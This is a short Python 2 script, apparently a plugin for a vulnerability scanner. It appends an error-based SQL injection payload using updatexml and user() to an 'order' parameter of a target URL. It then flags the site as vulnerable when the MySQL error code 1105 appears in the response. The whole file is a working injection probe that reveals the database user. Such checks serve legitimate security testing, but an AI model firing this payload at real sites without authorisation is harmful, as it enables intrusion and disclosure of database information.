#-*-coding:utf-8-*-
import requests
import txconfig
import sys

def main(param):
    headers = txconfig.Request_Param.HEADERS
    result = {
        "success": False,
        "result": {}
    }
    try:
        url = param
    except Exception as e:
        result['result'] = e
        return result
    payload = '?order[updatexml(1,concat(0x3a,user()),1)]'
    url = url + payload
    Re = requests.get(url,headers=headers)
    if "1105" in Re.text:
        result['success'] = True
        return result
    else:
        return result

if __name__ == '__main__':
    param = sys.argv[1]
    print main(param)